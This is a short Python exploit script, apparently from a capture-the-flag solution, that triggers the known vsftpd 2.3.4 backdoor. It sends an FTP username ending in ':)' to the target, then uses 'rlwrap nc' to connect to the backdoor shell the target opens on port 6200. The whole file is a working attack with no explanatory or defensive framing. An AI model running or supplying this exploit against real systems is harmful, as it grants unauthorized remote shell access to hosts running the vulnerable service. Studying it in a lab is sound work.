#!/usr/bin/env python3

import socket
import subprocess
import sys
import time

if len(sys.argv) < 2:
    print(f"{sys.argv[0]} [ip] [port = 21]")
    print("port defaults to 21 if not given")
    sys.exit()
elif len(sys.argv) == 2:
    port = 21
else:
    port = int(sys.argv[2])
target = sys.argv[1]

print(f"[*] Connecting to {target}:{port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(b'USER 0xdf:)\n')
s.send(b'PASS 0xdf\n')
time.sleep(2)
s.close()
print('[+] Backdoor triggered')
print('[*] Connecting')

try:
    sh = subprocess.Popen(f"rlwrap nc {target} 6200", shell=True)
    sh.poll()
    sh.wait()
except KeyboardInterrupt:
    print("[!] Exiting Shell")
